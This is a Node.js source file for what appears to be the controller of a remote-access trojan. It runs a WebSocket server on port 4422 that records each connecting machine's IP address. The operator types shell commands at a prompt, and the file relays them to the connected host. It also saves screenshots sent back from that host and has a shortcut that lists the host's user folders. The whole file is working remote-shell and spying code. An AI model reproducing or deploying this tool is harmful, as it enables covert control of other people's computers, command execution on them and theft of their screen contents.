const WebSocket = require('ws');
const colors = require('colors');
var keypress = require('keypress');
keypress(process.stdin);
var pos = 1;
var cursorPos = 0;
const cliCursor = require('cli-cursor');
require('events').EventEmitter.setMaxListeners = 1;
var workingDir = "";
process.stdin.setRawMode(true);
process.stdin.resume();
cmdHistory = [""];
sessions = [];
currentSession = 0;
const wss = new WebSocket.Server({
	port: 4422
});

wss.on('connection', function connection(ws) {
	sessions.push(ws);
	currentSession = sessions.length - 1;
	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !");
	ws.on('message', function incoming(message) {

		if (message.startsWith("hello")) {
			workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
			process.stdout.write(workingDir.bold.white + "> ".white);
		} else if (message.startsWith("##finish##")) {
			ws.send("#pwd");
		} else if (message.startsWith("##SCREENSHOT##")) {
			var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
			require("fs").writeFile("screenshots/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
		} else {
			console.log(message.grey);
		}
	});
	ws.on('close', function (reasonCode, description) {
		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
	});

});

process.stdin.on("keypress", function (ch, key) {
	if (key && key.name == "up") {
		if (pos + 1 <= cmdHistory.length) {
			pos++;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
		}
	} else if (key && key.name == "down") {
		if (pos - 1 > 0) {
			pos--;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
		}
	} else if (key && key.name == "left") {
		try{
		if (cursorPos - 1 >= 0) {
			cliCursor.hide();
			cursorPos = cursorPos - 1;
			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
			cmdHistory[cmdHistory.length - pos] = before + cc + after;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
		}}catch(e){}
	} else if (key && key.name == "right") {
		try{
		if (cursorPos + 1 < cmdHistory[cmdHistory.length - pos].length - 1) {
			cursorPos = cursorPos + 1;
			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
			cmdHistory[cmdHistory.length - pos] = before + cc + after;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);

		} else {
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
			cliCursor.show();
			cursorPos = cursorPos + 1;
		}
	}catch(e){}
	} else if (key && key.name == "backspace") {
		try{
		if (cursorPos != cmdHistory[cmdHistory.length - pos].length - 1) {
			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos, cmdHistory[cmdHistory.length - pos.length - 1]);
			before = before.slice(0, -1);
			cmdHistory[cmdHistory.length - pos] = before + after;
			cursorPos = cursorPos - 1;
			before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			cc = cmdHistory[cmdHistory.length - pos][cursorPos];
			after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
			cmdHistory[cmdHistory.length - pos] = before + cc + after;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
		} else {
			cmdHistory[cmdHistory.length - pos] = cmdHistory[cmdHistory.length - pos].substring(0, cmdHistory[cmdHistory.length - pos].length - 1);
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
		}}catch(e){}
	} else if (key && key.ctrl && key.name == 'c') {
		process.exit()
	} else if (key && key.name == "return") {
		process.stdout.clearLine();
		process.stdout.cursorTo(0);
		process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos] + "\n");
		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
		}else if(cmdHistory[cmdHistory.length - 1] == "list_users"){
			sessions[currentSession].send("cd /Users & dir");
		}else{
			sessions[currentSession].send(cmdHistory[cmdHistory.length - pos]);
		}
		if (pos == 1) cmdHistory[cmdHistory.length] = "";
		pos = 1;
		cursorPos = 0;
	} else {
		if (cursorPos == cmdHistory[cmdHistory.length - pos].length - 1 || (cursorPos == 0 && cmdHistory[cmdHistory.length - pos] == 0)) {
			if (key != undefined) cmdHistory[cmdHistory.length - pos] += key.sequence;
			else cmdHistory[cmdHistory.length - pos] += ch;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
		} else {
			var add = "";
			if (key != undefined) add = key.sequence;
			else add = ch;
			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos, cmdHistory[cmdHistory.length - pos.length - 1]);
			before += add;
			cmdHistory[cmdHistory.length - pos] = before + after;
			cursorPos = cursorPos + 1;
			before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
			cc = cmdHistory[cmdHistory.length - pos][cursorPos];
			after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
			cmdHistory[cmdHistory.length - pos] = before + cc + after;
			process.stdout.clearLine();
			process.stdout.cursorTo(0);
			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
		}
	}
});


